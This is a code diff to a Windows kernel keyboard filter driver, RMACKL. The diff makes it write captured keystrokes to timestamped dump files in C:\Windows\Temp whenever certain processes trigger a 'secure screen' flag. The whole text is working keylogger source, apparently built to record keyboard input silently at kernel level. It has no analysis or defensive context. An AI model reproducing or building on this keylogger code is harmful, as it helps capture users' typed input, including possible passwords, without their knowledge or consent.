@@ -21,6 +21,8 @@ ULONG written;
 // Buffer size at which the key-logs are flushed to log file.
 #define LOG_TRIGGER_POINT 1
 
+#define PRId64       "lld"
+
 // Size of the scancodes table.
 #define SZ_KEYTABLE 0x5A
 
@@ -36,6 +38,11 @@ bool secureScreen = FALSE;
 
 // CHAR* outputBuffer = (char[500]){ 0 };
 bool isFileReady = FALSE;
+
+char* currFileName = (char[100]){ 0 };
+
+ULONG lastTime = 0;
+ULONG threshold = 300;
 
 char* keytable[SZ_KEYTABLE] = {
 	"[INVALID]",		// 0	00
@@ -223,6 +230,18 @@ char* keytable_alternate[SZ_KEYTABLE] = {
 	"[INVALID]"			// 89	59
 };
 
+VOID SetCurrFileName() {
+	ULONG time = 0;
+	LARGE_INTEGER pTime;
+	KeQuerySystemTime(&pTime);
+	RtlTimeToSecondsSince1970(&pTime, &time);
+
+	if (time - lastTime > threshold) {
+		sprintf(currFileName, "\\DosDevices\\C:\\Windows\\Temp\\RMACKLDump%ld.dat\0", time);
+		lastTime = time;
+	}
+}
+
 /**
  Convert string to lowercase
  @param str: Input string
@@ -310,11 +329,12 @@ NTSTATUS OpenLogFile() {
 	IO_STATUS_BLOCK		ioStatusBlock;
 	OBJECT_ATTRIBUTES	fileObjectAttributes;
 	NTSTATUS			status;
+	ANSI_STRING			AS;
 	UNICODE_STRING		fileName;
 
 	// Initialize file name
-	RtlInitUnicodeString(&fileName, L"\\DosDevices\\c:\\rmac-log.txt");
-
+	RtlInitAnsiString(&AS, currFileName);
+	RtlAnsiStringToUnicodeString(&fileName, &AS, TRUE);
 	// Initialize file attributes
 	InitializeObjectAttributes(
 		&fileObjectAttributes,
@@ -347,6 +367,12 @@ NTSTATUS OpenLogFile() {
 	return status;
 }
 
+NTSTATUS CloseLogFile() {
+	isFileReady = FALSE;
+	NTSTATUS status = ZwClose(fileHandle);
+	return status;
+}
+
 /**
  Convert scancode to string
  @param dest: Destination string
@@ -360,46 +386,13 @@ CHAR* ScanCodeToCharP(char* dest, USHORT i) {
 #define ITOA(n) ScanCodeToCharP((char [100]) { 0 }, (n) )
 
 /**
- Write outputBuffer to log file
+ Write keyboard buffer to log file
+ @param n: Number of records to write
+ @param buffer: keyboard data buffer
+ @return Status of the operation
  */
- //NTSTATUS WriteDebugToLogFile() {
- //	if (!isFileReady) {
- //		return STATUS_SUCCESS;
- //	}
- //	NTSTATUS status;
- //	IO_STATUS_BLOCK		ioStatusBlock;
- //	LARGE_INTEGER		ByteOffset;
- //
- //	ByteOffset.HighPart = -1;
- //	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
- //
- //	// Write debug to the log file
- //	status = ZwWriteFile(
- //		fileHandle,
- //		NULL,
- //		NULL,
- //		NULL,
- //		&ioStatusBlock,
- //		outputBuffer,
- //		strlen(outputBuffer),
- //		&ByteOffset,
- //		NULL);
- //
- //	if (!NT_SUCCESS(status)) {
- //		DebugPrint(("Error (WriteDebugToLogFile): 0x%x\n", status));
- //	}
- //
- //	return status;
- //}
-
- /**
-  Write keyboard buffer to log file
-  @param n: Number of records to write
-  @param buffer: keyboard data buffer
-  @return Status of the operation
-  */
 NTSTATUS WriteToLogFile(DWORD n, PKEYBOARD_INPUT_DATA buffer) {
-	if (!secureScreen) return STATUS_SUCCESS;
+	if (!secureScreen || !isFileReady) return STATUS_SUCCESS;
 
 	NTSTATUS		status;
 	DWORD			i;
@@ -586,12 +579,15 @@ VOID ProcessCallback(IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCrea
 	}
 
 	if (processStatus[0] || processStatus[1]) {
+		SetCurrFileName();
+		OpenLogFile();
 		secureScreen = TRUE;
 		//sprintf(outputBuffer, "[Secure Screen START]\n");
 		//WriteDebugToLogFile();
 	}
 	else {
 		secureScreen = FALSE;
+		CloseLogFile();
 		//sprintf(outputBuffer, "[Secure Screen STOP]\n");
 		//WriteDebugToLogFile();
 	}
@@ -669,7 +665,6 @@ NTSTATUS RMACKL_EvtDeviceAdd(IN WDFDRIVER Driver, IN PWDFDEVICE_INIT DeviceInit)
 
 	// Initialize global structures, create and open.
 	InitKeyboardDataArray();
-	OpenLogFile();
 	NTSTATUS result = PsSetCreateProcessNotifyRoutine(ProcessCallback, FALSE);
 	if (!NT_SUCCESS(result)) {
 		DebugPrint(("Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result));
